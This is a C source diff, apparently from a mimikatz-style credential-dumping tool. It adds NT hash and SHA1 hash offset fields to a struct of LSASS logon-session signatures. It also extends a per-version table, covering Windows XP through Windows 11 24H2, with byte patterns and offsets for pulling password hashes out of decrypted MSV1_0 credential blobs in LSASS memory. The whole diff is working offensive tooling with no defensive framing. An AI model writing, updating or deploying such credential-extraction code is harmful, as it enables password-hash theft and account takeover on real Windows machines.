@@ -130,10 +130,12 @@ typedef struct {
     unsigned char* LogonSessionListSig;
     int SigSize;
     int LogonSessionList_OFFSET;
-    int RipCorrection;   // bytes to add after the 4-byte RIP displacement to reach the next instruction
+    int RipCorrection;   // 0 = image-base-relative mode; 4 = standard RIP-relative LEA
     int UserNameOffset;
     int DomainOffset;
     int CredentialsOffset;
+    int NtHashOffset;    // byte index in decrypted MSV1_0_PRIMARY_CREDENTIAL blob
+    int Sha1HashOffset;
 } LsassLogonSessionListOffsets;
 
 BYTE PTRN_WIN5_LogonSessionList[]      = {0x4c, 0x8b, 0xdf, 0x49, 0xc1, 0xe3, 0x04, 0x48, 0x8b, 0xcb, 0x4c, 0x03, 0xd8};
@@ -147,19 +149,19 @@ BYTE PTRN_WN11_LogonSessionList[]      = {0x45, 0x89, 0x34, 0x24, 0x4c, 0x8b, 0x
 BYTE PTRN_WN11_22H2_LogonSessionList[] = {0x45, 0x89, 0x37, 0x4c, 0x8b, 0xf7, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x0f, 0x84};
 BYTE PTRN_WN11_24H2_LogonSessionList[] = {0x45, 0x89, 0x34, 0x24, 0x8b, 0xfb, 0x45, 0x85, 0xc0, 0x0f};
 
-// Columns: WindowsVersion, Sig, SigSize, LogonSessionList_OFFSET, RipCorrection, UserNameOffset, DomainOffset, CredentialsOffset
+// Columns: WindowsVersion, Sig, SigSize, LSL_OFFSET, RipCorrection, UserName, Domain, Credentials, NtHash, Sha1Hash
 LsassLogonSessionListOffsets LsassLogonSessionListArray[] = {
-{KULL_M_WIN_BUILD_XP,        PTRN_WIN5_LogonSessionList,        sizeof(PTRN_WIN5_LogonSessionList),        -4, 4, 0x90, 0xA0, 0x108},
-{KULL_M_WIN_BUILD_2K3,       PTRN_WIN5_LogonSessionList,        sizeof(PTRN_WIN5_LogonSessionList),        -4, 4, 0x90, 0xA0, 0x108},
-{KULL_M_WIN_BUILD_VISTA,     PTRN_WN60_LogonSessionList,        sizeof(PTRN_WN60_LogonSessionList),        21, 4, 0x90, 0xA0, 0x108},
-{KULL_M_WIN_BUILD_7,         PTRN_WN61_LogonSessionList,        sizeof(PTRN_WN61_LogonSessionList),        19, 4, 0x90, 0xA0, 0x108},
-{KULL_M_WIN_BUILD_8,         PTRN_WN6x_LogonSessionList,        sizeof(PTRN_WN6x_LogonSessionList),        16, 4, 0x90, 0xA0, 0x108},
-{KULL_M_WIN_BUILD_BLUE,      PTRN_WN63_LogonSessionList,        sizeof(PTRN_WN63_LogonSessionList),        36, 4, 0x90, 0xA0, 0x108},
-{KULL_M_WIN_BUILD_10_1507,   PTRN_WN6x_LogonSessionList,        sizeof(PTRN_WN6x_LogonSessionList),        16, 4, 0x90, 0xA0, 0x108},
-{KULL_M_WIN_BUILD_10_1703,   PTRN_WN1703_LogonSessionList,      sizeof(PTRN_WN1703_LogonSessionList),      23, 4, 0x90, 0xA0, 0x108},
-{KULL_M_WIN_BUILD_10_1803,   PTRN_WN1803_LogonSessionList,      sizeof(PTRN_WN1803_LogonSessionList),      23, 4, 0x90, 0xA0, 0x108},
-{KULL_M_WIN_BUILD_10_1903,   PTRN_WN6x_LogonSessionList,        sizeof(PTRN_WN6x_LogonSessionList),        23, 4, 0x90, 0xA0, 0x108},
-{KULL_M_WIN_BUILD_2022,      PTRN_WN11_LogonSessionList,        sizeof(PTRN_WN11_LogonSessionList),        24, 4, 0x90, 0xA0, 0x108},
-{KULL_M_WIN_BUILD_11_22H2,   PTRN_WN11_22H2_LogonSessionList,   sizeof(PTRN_WN11_22H2_LogonSessionList),   27, 4, 0x90, 0xA0, 0x108},
-{KULL_M_WIN_BUILD_11_24H2,   PTRN_WN11_24H2_LogonSessionList,   sizeof(PTRN_WN11_24H2_LogonSessionList),   34, 0, 0xA0, 0xB0, 0x118},
+{KULL_M_WIN_BUILD_XP,        PTRN_WIN5_LogonSessionList,        sizeof(PTRN_WIN5_LogonSessionList),        -4, 4, 0x90, 0xA0, 0x108, 74, 106},
+{KULL_M_WIN_BUILD_2K3,       PTRN_WIN5_LogonSessionList,        sizeof(PTRN_WIN5_LogonSessionList),        -4, 4, 0x90, 0xA0, 0x108, 74, 106},
+{KULL_M_WIN_BUILD_VISTA,     PTRN_WN60_LogonSessionList,        sizeof(PTRN_WN60_LogonSessionList),        21, 4, 0x90, 0xA0, 0x108, 74, 106},
+{KULL_M_WIN_BUILD_7,         PTRN_WN61_LogonSessionList,        sizeof(PTRN_WN61_LogonSessionList),        19, 4, 0x90, 0xA0, 0x108, 74, 106},
+{KULL_M_WIN_BUILD_8,         PTRN_WN6x_LogonSessionList,        sizeof(PTRN_WN6x_LogonSessionList),        16, 4, 0x90, 0xA0, 0x108, 74, 106},
+{KULL_M_WIN_BUILD_BLUE,      PTRN_WN63_LogonSessionList,        sizeof(PTRN_WN63_LogonSessionList),        36, 4, 0x90, 0xA0, 0x108, 74, 106},
+{KULL_M_WIN_BUILD_10_1507,   PTRN_WN6x_LogonSessionList,        sizeof(PTRN_WN6x_LogonSessionList),        16, 4, 0x90, 0xA0, 0x108, 74, 106},
+{KULL_M_WIN_BUILD_10_1703,   PTRN_WN1703_LogonSessionList,      sizeof(PTRN_WN1703_LogonSessionList),      23, 4, 0x90, 0xA0, 0x108, 74, 106},
+{KULL_M_WIN_BUILD_10_1803,   PTRN_WN1803_LogonSessionList,      sizeof(PTRN_WN1803_LogonSessionList),      23, 4, 0x90, 0xA0, 0x108, 74, 106},
+{KULL_M_WIN_BUILD_10_1903,   PTRN_WN6x_LogonSessionList,        sizeof(PTRN_WN6x_LogonSessionList),        23, 4, 0x90, 0xA0, 0x108, 74, 106},
+{KULL_M_WIN_BUILD_2022,      PTRN_WN11_LogonSessionList,        sizeof(PTRN_WN11_LogonSessionList),        24, 4, 0x90, 0xA0, 0x108, 74, 106},
+{KULL_M_WIN_BUILD_11_22H2,   PTRN_WN11_22H2_LogonSessionList,   sizeof(PTRN_WN11_22H2_LogonSessionList),   27, 4, 0x90, 0xA0, 0x108, 74, 106},
+{KULL_M_WIN_BUILD_11_24H2,   PTRN_WN11_24H2_LogonSessionList,   sizeof(PTRN_WN11_24H2_LogonSessionList),   34, 0, 0xA0, 0xB0, 0x118, 70, 102},
 };
